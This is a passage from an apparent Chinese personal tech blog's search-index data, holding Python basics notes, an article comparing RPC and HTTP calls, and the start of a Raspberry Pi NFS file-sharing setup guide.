a[2]</code>，会自动变长<br>也可以支持在任何一个位置插入分片实现变长和删除元素：<code>a[1]=[2,3,4]</code></p>\n<p>成员方法：</p>\n<ul>\n<li><code>append</code>：在列表末尾追加新对象，它直接修改原来的列表。</li>\n<li><code>extend</code>：新列表扩展原有的列表。</li>\n<li><code>insert</code>：将对象插入到列表中。</li>\n<li><code>remove</code>：用于移除列表中某个值的第一个匹配项。注意：该方法是一个没有返回值的原位置改变方法。</li>\n<li><code>reverse</code>：将列表中的元素反向存放。注意：该方法改变了列表但不返回值。</li>\n<li><code>sort</code>：排序</li>\n</ul>\n<p>返回<strong>新的</strong>排序后的列表（不变性）：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>arr = [<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"number\">9</span>,<span class=\"number\">1</span>,<span class=\"number\">9</span>,<span class=\"number\">8</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>sorted_arr = <span class=\"built_in\">sorted</span>(arr)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>arr</span><br><span class=\"line\">[<span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">1</span>, <span class=\"number\">4</span>, <span class=\"number\">1</span>, <span class=\"number\">9</span>, <span class=\"number\">1</span>, <span class=\"number\">9</span>, <span class=\"number\">8</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>sorted_arr</span><br><span class=\"line\">[<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">4</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">9</span>]</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"元组\"><a href=\"#元组\" class=\"headerlink\" title=\"元组\"></a>元组</h3><p>创建：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span></span><br><span class=\"line\">(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>)</span><br><span class=\"line\">&gt;&gt; (<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>)</span><br><span class=\"line\">(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>)</span><br><span class=\"line\">&gt;&gt; <span class=\"built_in\">tuple</span>([<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]) <span class=\"comment\">#列表强转</span></span><br><span class=\"line\">(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>)</span><br></pre></td></tr></table></figure><br>元组对象具有不变性，可以当成其他语言的Immutable List用。当元组长度为1，必须再写一个逗号：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">type</span>((<span class=\"number\">1</span>))</span><br><span class=\"line\">&lt;<span class=\"class\"><span class=\"keyword\">class</span> &#x27;<span class=\"title\">int</span>&#x27;&gt;</span></span><br><span class=\"line\"><span class=\"class\">&gt;&gt;&gt; <span class=\"title\">type</span>(<span class=\"params\">(<span class=\"params\"><span class=\"number\">1</span>,</span>)</span>)</span></span><br><span class=\"line\"><span class=\"class\">&lt;<span class=\"title\">class</span> &#x27;<span class=\"title\">tuple</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"字典\"><a href=\"#字典\" class=\"headerlink\" title=\"字典\"></a>字典</h3><p>字典是python中唯一内建的映射类型，字典中是无序的，所有存储在一个特定键下，键可以是数字，字符串，甚至元组。</p>\n<p>创建<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">d = =&#123;&#x27;age&#x27;:42, &#x27;name&#x27;: &#x27;Gumby&#x27;&#125;</span><br><span class=\"line\">items = [(&#x27;name&#x27;,&#x27;Gumby&#x27;),(&#x27;age&#x27;,42)]</span><br><span class=\"line\">d = dict(items) </span><br></pre></td></tr></table></figure><br>基本字典操作：</p>\n<ul>\n<li><code>len(d)</code>返回d中项（键-值对）的数量</li>\n<li><code>d[k]</code>返回到关联到键k上的值</li>\n<li><code>d[k]=v</code>将值v关联到键k上</li>\n<li><code>del d[k]</code>删除键为k的项</li>\n<li><code>k in d</code> 检查d中是否含有键为k的项</li>\n</ul>\n<p>字典方法：</p>\n<ul>\n<li><code>clear()</code>方法清除字典中的所有项。</li>\n<li><code>copy()</code>方法返回一个具有相同键-值对的新字典。</li>\n<li><code>get()</code>返回键Key映射的值。如果键Key不存在，返回空值。可用default参数指定不存在的键的返回值。</li>\n<li><code>pop()</code>从字典中删除键，并返回映射值。若键不存在，则返回default;未指定default参数时会出错。</li>\n<li><code>popitem()</code>从字典删除并返回键值对元组。空字典调用该方法会产生KeyError错误。 - <code>setdefault()</code>该方法用于返回映射值或者为字典添加键值对。</li>\n<li><code>update()</code>该方法用于为字典添加键值对。</li>\n</ul>\n<p>字典视图：字典的<code>items()</code>、<code>keys()</code>和<code>values()</code>方法用于返回字典键值对的视图对象，视图对象支持迭代操作，并可反映对字典的修改。视图对象不是列表，不支持索引。通常用<code>list()</code>方法将视图对象转换为列表。</p>\n<ol>\n<li><code>Items()</code>方法返回键值对视图。</li>\n<li><code>keys()</code>方法返回字典中所有键的视图。</li>\n<li><code>values()</code>方法放回字典中全部值的视图。</li>\n<li>键视图的集合操作：键视图支持各种集合运算，键值对视图和值视图不支持集合运算</li>\n</ol>\n<p>字典解包合并：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>d1 = &#123;<span class=\"string\">&quot;name&quot;</span>:<span class=\"string\">&quot;thankod&quot;</span>&#125;</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>d2 = &#123;<span class=\"string\">&quot;age&quot;</span>:<span class=\"number\">24</span>&#125;</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>&#123;**d1,**d2&#125;</span><br><span class=\"line\">&#123;<span class=\"string\">&#x27;name&#x27;</span>: <span class=\"string\">&#x27;thankod&#x27;</span>, <span class=\"string\">&#x27;age&#x27;</span>: <span class=\"number\">24</span>&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"文件操作\"><a href=\"#文件操作\" class=\"headerlink\" title=\"文件操作\"></a>文件操作</h2><p><code>myfile = open(&quot;filename&quot;)</code>打开文件<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">myfile.read() #把文件内容读入一个字符串</span><br><span class=\"line\">myfile.read(n) #把n个字符读进一个字符串</span><br><span class=\"line\">myfile.readline() #把下一个换行符号之前的内容读入一个字符串，付出内容包含航尾符号</span><br><span class=\"line\">myfile.readlines() #把整个文件内容读入一个字符串列表，每一行为一个字符串</span><br><span class=\"line\">myfile.write(xstring) #把字符串写入文件指针位置，返回写入的字符个数</span><br><span class=\"line\">myfile.writelines(xlist) #把列表写入文件指针位置，返回写入字符个数</span><br><span class=\"line\">myfile.seek(n) #将文件指针移动到第n个字节，0表示只想文件开头</span><br><span class=\"line\">myfile.tell() #返回文件指针当前位置</span><br><span class=\"line\">for line in myfile # 迭代的方式从文件中每次读一行</span><br></pre></td></tr></table></figure><br>读写二进制文件需要用到<code>pickle</code>模块处理文件中对象的读写<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\">data = &#123;<span class=\"string\">&quot;msg&quot;</span>:<span class=\"string\">&quot;hello&quot;</span>&#125;</span><br><span class=\"line\">save_file = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;save.dat&#x27;</span>,<span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\">pickle.dump(data,save_file)</span><br><span class=\"line\">save_file.close()</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;save_dat&#x27;</span>,<span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> load_file:</span><br><span class=\"line\">    load_data = pickle.load(load_file)</span><br><span class=\"line\"><span class=\"comment\"># 使用with打开文件，不需要手动load_file.close()，这是个好习惯</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"循环和条件语句\"><a href=\"#循环和条件语句\" class=\"headerlink\" title=\"循环和条件语句\"></a>循环和条件语句</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"number\">1</span>==<span class=\"number\">2</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"keyword\">elif</span> <span class=\"number\">2</span>==<span class=\"number\">2</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"number\">3</span>)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> var <span class=\"keyword\">in</span> <span class=\"built_in\">object</span>:</span><br><span class=\"line\">    loop_statment</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> cond:</span><br><span class=\"line\">    loop_statement</span><br></pre></td></tr></table></figure>\n<p>列表循环的写法：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">t = [<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(t)):</span><br><span class=\"line\">    t[x] = t[x] + <span class=\"number\">10</span></span><br></pre></td></tr></table></figure><br>等价于<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">t = [x+<span class=\"number\">10</span> <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> t]</span><br></pre></td></tr></table></figure><br>筛选<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">t = [x+<span class=\"number\">10</span> <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> t <span class=\"keyword\">if</span>(x % <span class=\"number\">2</span> == <span class=\"number\">0</span>)]</span><br></pre></td></tr></table></figure><br>多层嵌套<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">[x+y <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> (<span class=\"number\">10</span>,<span class=\"number\">20</span>) <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> (<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>)]</span><br></pre></td></tr></table></figure></p>\n<p>zip函数参数为多个可迭代对象，每次从每个可迭代对象中取一个值组成一个元组，直到可迭代对象中的值取完，生成的zip对象包含了一系列的元组。<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>x = <span class=\"built_in\">zip</span>((<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>),(<span class=\"number\">10</span>,<span class=\"number\">20</span>,<span class=\"number\">30</span>))</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">next</span>(x)</span><br><span class=\"line\">(<span class=\"number\">1</span>,<span class=\"number\">10</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">next</span>(x)</span><br><span class=\"line\">(<span class=\"number\">2</span>,<span class=\"number\">20</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">next</span>(x)</span><br><span class=\"line\">(<span class=\"number\">3</span>,<span class=\"number\">30</span>)</span><br></pre></td></tr></table></figure></p>\n<p>map函数用于将函数映射到可迭代对象，对可迭代对象中的每个元素应用该函数，函数返回值包含在生成的map对象中,ord函数返回字符的ASCII码<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>x = <span class=\"built_in\">map</span>(<span class=\"built_in\">ord</span>,<span class=\"string\">&#x27;abc&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">next</span>(x)</span><br><span class=\"line\"><span class=\"number\">97</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">next</span>(x)</span><br><span class=\"line\"><span class=\"number\">98</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">next</span>(x)</span><br><span class=\"line\"><span class=\"number\">99</span></span><br></pre></td></tr></table></figure></p>\n<p>filter函数与map函数有点类似，filter函数用指定函数处理可迭代对象。若函数返回值为真，则对应课迭代对象元素包含在生成的filter对象序列中。<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">b = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>]</span><br><span class=\"line\">a = <span class=\"built_in\">list</span>(<span class=\"built_in\">filter</span>(<span class=\"keyword\">lambda</span> item:item&gt;<span class=\"number\">2</span>,b))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a)</span><br></pre></td></tr></table></figure><br>输出[3,4,5,6]</p>\n<p>循环过程中获得索引：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>arr = [<span class=\"string\">&quot;114&quot;</span>,<span class=\"string\">&quot;514&quot;</span>,<span class=\"string\">&quot;1919&quot;</span>,<span class=\"string\">&quot;810&quot;</span>]</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">for</span> i, x <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(arr):</span><br><span class=\"line\"><span class=\"meta\">... </span>    <span class=\"built_in\">print</span>(i,x)</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"number\">0</span> <span class=\"number\">114</span></span><br><span class=\"line\"><span class=\"number\">1</span> <span class=\"number\">514</span></span><br><span class=\"line\"><span class=\"number\">2</span> <span class=\"number\">1919</span></span><br><span class=\"line\"><span class=\"number\">3</span> <span class=\"number\">810</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"字符串格式化\"><a href=\"#字符串格式化\" class=\"headerlink\" title=\"字符串格式化\"></a>字符串格式化</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">print</span>(<span class=\"string\">&quot;I am a %s, my name is %s&quot;</span> %(<span class=\"string\">&quot;boy&quot;</span>,<span class=\"string\">&quot;thankod&quot;</span>))</span><br><span class=\"line\">I am a boy, my name <span class=\"keyword\">is</span> thankod</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">print</span>(<span class=\"string\">&quot;I am a &#123;0&#125;, my name is &#123;1&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"string\">&quot;boy&quot;</span>,<span class=\"string\">&quot;thankod&quot;</span>))</span><br><span class=\"line\">I am a boy, my name <span class=\"keyword\">is</span> thankod</span><br></pre></td></tr></table></figure>\n<h2 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h2><p>一般定义：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">print_word</span>(<span class=\"params\">word</span>):</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;hello %&quot;</span> %word)</span><br></pre></td></tr></table></figure><br>匿名函数lamda：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">a = <span class=\"built_in\">list</span>(<span class=\"built_in\">filter</span>(<span class=\"keyword\">lambda</span> item:item &gt; <span class=\"number\">2</span>,b))</span><br></pre></td></tr></table></figure><br>解构元组参数：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">plus</span>(<span class=\"params\">a,b</span>):</span></span><br><span class=\"line\"><span class=\"meta\">... </span>    <span class=\"keyword\">return</span> a + b</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>args = (<span class=\"number\">3</span>,<span class=\"number\">4</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>plus(*args)</span><br><span class=\"line\"><span class=\"number\">7</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"yield\"><a href=\"#yield\" class=\"headerlink\" title=\"yield\"></a>yield</h2><p>yield可以将函数编程一个生成器，在return前就输出每次迭代的结果。<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fibonacci</span>(<span class=\"params\">n</span>):</span></span><br><span class=\"line\"><span class=\"meta\">... </span>    a,b = <span class=\"number\">1</span>,<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"meta\">... </span>    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\"><span class=\"meta\">... </span>        <span class=\"keyword\">yield</span> a</span><br><span class=\"line\"><span class=\"meta\">... </span>        a, b = b, a + b</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">for</span> out <span class=\"keyword\">in</span> fibonacci(<span class=\"number\">10</span>):</span><br><span class=\"line\"><span class=\"meta\">... </span>    <span class=\"built_in\">print</span>(out)</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"number\">8</span></span><br><span class=\"line\"><span class=\"number\">13</span></span><br><span class=\"line\"><span class=\"number\">21</span></span><br><span class=\"line\"><span class=\"number\">34</span></span><br><span class=\"line\"><span class=\"number\">55</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"模块-包\"><a href=\"#模块-包\" class=\"headerlink\" title=\"模块 包\"></a>模块 包</h2><p>多个模块构成了包，引入例子：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> image</span><br><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"面向对象\"><a href=\"#面向对象\" class=\"headerlink\" title=\"面向对象\"></a>面向对象</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Duck</span>(<span class=\"params\">Animals</span>):</span> <span class=\"comment\">#父类是Animal</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self,_name</span>):</span> <span class=\"comment\">#构造函数</span></span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">quake</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;i am % ,ga ga&#x27;</span> %self.name)</span><br></pre></td></tr></table></figure>\n<p>python的对象成员方法，即使是构造器，也要写self参数。即使在对象内部调用内部方法，也要写成self.method(),调用</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">duck = Duck(<span class=\"string\">&#x27;Donnald&#x27;</span>)</span><br><span class=\"line\">duck.quake()</span><br></pre></td></tr></table></figure>\n<h2 id=\"第三方包\"><a href=\"#第三方包\" class=\"headerlink\" title=\"第三方包\"></a>第三方包</h2><h3 id=\"Numpy\"><a href=\"#Numpy\" class=\"headerlink\" title=\"Numpy\"></a>Numpy</h3><p>Numpy是Python中科学计算的基础包，可用来存储和处理大型矩阵。它的主要对象是同种<br>元素的多维数组（以及派生的矩阵等），NumPy的数组类被称作 ndarray 。在NumPy中<br>维度(dimensions)叫做轴(axes)，轴的个数叫做秩(rank)。</p>\n<p><a href=\"http://www.360doc.com/content/15/0209/20/2459_447540142.shtml\">学习参考地址</a></p>\n<h3 id=\"pandas包\"><a href=\"#pandas包\" class=\"headerlink\" title=\"pandas包\"></a>pandas包</h3><p>pandas是python环境下最有名的数据统计包， pandas包中主要的数据结构是DataFrame。</p>\n<p>DataFrame翻译为数据框，是一种数据组织方式，每列可以是不同的值类型（数值、字符<br>串、布尔值等）。Dataframe的优点是可以按列来操作数据。</p>\n<h3 id=\"turtle包\"><a href=\"#turtle包\" class=\"headerlink\" title=\"turtle包\"></a>turtle包</h3><p>turtle是一个简单的画图工具，封装了logo语言<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> turtle</span><br><span class=\"line\">t = turtle.Pen()</span><br><span class=\"line\">t.left(<span class=\"number\">120</span>) <span class=\"comment\">#右转/度</span></span><br><span class=\"line\">t.forward(<span class=\"number\">10</span>) <span class=\"comment\">#前进/像素</span></span><br><span class=\"line\">t.right(<span class=\"number\">120</span>)</span><br><span class=\"line\">t.forward(<span class=\"number\">10</span>)</span><br><span class=\"line\">t.reset() <span class=\"comment\">#复位</span></span><br></pre></td></tr></table></figure></p>\n","tags":["Python"]},{"title":"RPC调用与HTTP调用","url":"/2021/04/02/RPC%E8%B0%83%E7%94%A8%E4%B8%8EHTTP%E8%B0%83%E7%94%A8/","content":"<p>RPC（Remote Procedure Call），在<a href=\"https://en.wikipedia.org/wiki/Remote_procedure_call\">Wiki</a>上的解释是：</p>\n<blockquote>\n<p>In distributed computing, a remote procedure call (RPC) is when a computer program causes a procedure (subroutine) to execute in a different address space (commonly on another computer on a shared network), which is coded as if it were a normal (local) procedure call, without the programmer explicitly coding the details for the remote interaction. </p>\n</blockquote>\n<p>RPC可以用于不同服务进程之间的通信（无论是不是在同一台机器上）。使用RPC可以在不用特定编程的基础上，像调用本地模块一样调用远端模块，这可以广泛用于分布式系统不同服务之间的调用。</p>\n<h3 id=\"RPC基本原理\"><a href=\"#RPC基本原理\" class=\"headerlink\" title=\"RPC基本原理\"></a>RPC基本原理</h3><p><img src=\"2.png\" alt=\"\"><br>假设Server1上要调用Server2上的<code>func</code>函数，完成一个基本的<code>a+b</code>运算。Server1需要先将需要把参数<code>1,3</code>序列化，打包成数据包后通过网络发给Server2。Server2拿到数据包后反序列化参数到内存，调用<code>func</code>方法，再把返回结果序列化后返回给Server1。RPC框架参与了数据的序列化和反序列化，数据包的封装与派发，调用目标函数等过程。开发者调用Server1上的<code>func</code>函数时，感觉就好像在调用本地函数一样。</p>\n<span id=\"more\"></span>\n<h3 id=\"RPC架构\"><a href=\"#RPC架构\" class=\"headerlink\" title=\"RPC架构\"></a>RPC架构</h3><p><img src=\"1.png\" alt=\"\"></p>\n<ul>\n<li>服务消费方（Client）调用以本地调用方式调用服务；</li>\n<li>Client Stub接收到调用后负责将方法、参数等组装成能够进行网络传输的消息体；</li>\n<li>Client Stub找到服务地址，并将消息发送到服务端；</li>\n<li>Server Stub收到消息后进行解码；</li>\n<li>Server Stub根据解码结果调用本地的服务；</li>\n<li>本地服务执行并将结果返回给Server stub；</li>\n<li>Server Stub将返回结果打包成消息并发送至消费方；</li>\n<li>Client Stub接收到消息，并进行解码；</li>\n<li>服务消费方得到最终结果。</li>\n</ul>\n<h3 id=\"不同RPC框架之间的关系\"><a href=\"#不同RPC框架之间的关系\" class=\"headerlink\" title=\"不同RPC框架之间的关系\"></a>不同RPC框架之间的关系</h3><p>常用的RPC框架有grpc，DUBBO,Thrift。</p>\n<ul>\n<li>grpc是Google最近公布的开源软件，基于最新的HTTP2.0协议，并支持常见的众多编程语言。我们知道HTTP2.0是基于二进制的HTTP协议升级版本，目前各大浏览器都在快马加鞭的加以支持。这个RPC框架是基于HTTP协议实现的，底层使用到了Netty框架的支持。</li>\n<li>Thrift是Facebook的一个开源项目，主要是一个跨语言的服务开发框架。它有一个代码生成器来对它所定义的IDL定义文件自动生成服务代码框架。用户只要在其之前进行二次开发就行，对于底层的RPC通讯等都是透明的。不过这个对于用户来说的话需要学习特定领域语言这个特性，还是有一定成本的。</li>\n<li>Dubbo是阿里集团开源的一个极为出名的RPC框架，在很多互联网公司和企业应用中广泛使用。协议和序列化框架都可以插拔是及其鲜明的特色。同样 的远程接口是基于Java Interface，并且依托于spring框架方便开发。可以方便的打包成单一文件，独立进程运行，和现在的微服务概念一致。</li>\n</ul>\n<p>dubbo中使用了netty作为网络传播的实现，netty中使用nio实现了传输过程的零拷贝，通过多路复用提升了网络I/O的性能。</p>\n<p>序列化和反序列化方式有JSON，XML等文本序列化方式，也可以使用protobuff等二进制序列化。RPC框架的性能差异往往由于采用的序列化/反序列化工具的和网络I/O策略。</p>\n<h3 id=\"RPC和HTTP的关系\"><a href=\"#RPC和HTTP的关系\" class=\"headerlink\" title=\"RPC和HTTP的关系\"></a>RPC和HTTP的关系</h3><p>RPC是一种思想，而HTTP是一种实现RPC的特殊形式，两者本质上都是基于TCP的协议。HTTP可以看成序列化方式是JSON的RPC协议，HTTP用作RPC的时候，需要带有HTTP请求头，而用更一般的基于Thirft，protobuff序列化的RPC框架，可以自定义协议，从而传递的数据包更精简，反序列化性能也更高。</p>\n<p>成熟的RPC框架还提供好了“服务自动注册与发现”、”智能负载均衡”、“可视化的服务治理和运维”、“运行期流量调度”等等功能，而HTTP的负载均衡往往需要Nginx的参与。</p>\n<h3 id=\"RPC-HTTP-MQ的使用场景\"><a href=\"#RPC-HTTP-MQ的使用场景\" class=\"headerlink\" title=\"RPC/HTTP/MQ的使用场景\"></a>RPC/HTTP/MQ的使用场景</h3><p>RPC，MQ，HTTP都可以用于模块间的相互调用。RPC和队列一般用于公司内部系统多个模块之间的通信，而HTTP一般用于开放服务，提供外部系统调用。</p>\n<p>使用基于HTTP的RESTfull接口的时候，要写一大份接口文档，严格地标明输入输出是什么，说清楚每一个接口的请求方法，以及请求参数需要注意的事项等。但是对于大型企业来说，内部子系统较多、接口非常多的情况下，RPC框架一般都有注册中心，有丰富的监控管理，发布、下线接口、动态扩展等，对调用方来说是无感知、统一化的操作。</p>\n<p>RPC服务主要是针对大型企业的，而HTTP服务主要是针对小企业的，因为RPC效率更高，而HTTP服务开发迭代会更快。</p>\n<p>RPC适用于同步调用（必须在调用后立刻获取返回结果），而队列适用于异步调用。</p>\n<blockquote>\n<p>参考资料</p>\n<ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/138651100\">https://zhuanlan.zhihu.com/p/138651100</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/334657641\">https://zhuanlan.zhihu.com/p/334657641</a></li>\n</ul>\n</blockquote>\n","tags":["RPC"]},{"title":"RasberryPi搭建NAS服务","url":"/2023/04/10/RasberryPi%E6%90%AD%E5%BB%BANAS%E6%9C%8D%E5%8A%A1/","content":"<h2 id=\"创建NFS服务\"><a href=\"#创建NFS服务\" class=\"headerlink\" title=\"创建NFS服务\"></a>创建NFS服务</h2><p>NFS(Network File System)用于Linux文件系统的跨网络文件共享。在Linux上搭建NFS服务的步骤如下：</p>\n<ol>\n<li><p>安装NFS服务相关包<br>如果系统是<code>Debian</code>系（Ubuntu、Raspian）:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install nfs-kernel-server</span><br></pre></td></tr></table></figure>\n<p>如果系统三<code>CentOS/RHEL/Fedora</code>之类使用<code>yum</code>作为包关系器:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo yum install nfs-utils</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>配置共享目录<br>创建你想通过NFS共享的目录。例如，共享的目录为<code>~/shared_folder</code>。<br>修改<code>/etc/exports</code>文件配置NFS共享路径：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/exports</span><br></pre></td></tr></table></figure>\n<p>为每一个需要共享的目录分别添加对应的配置条目，格式如下：</p>\n<figure class=\"highlight bash\"><table><tr><td 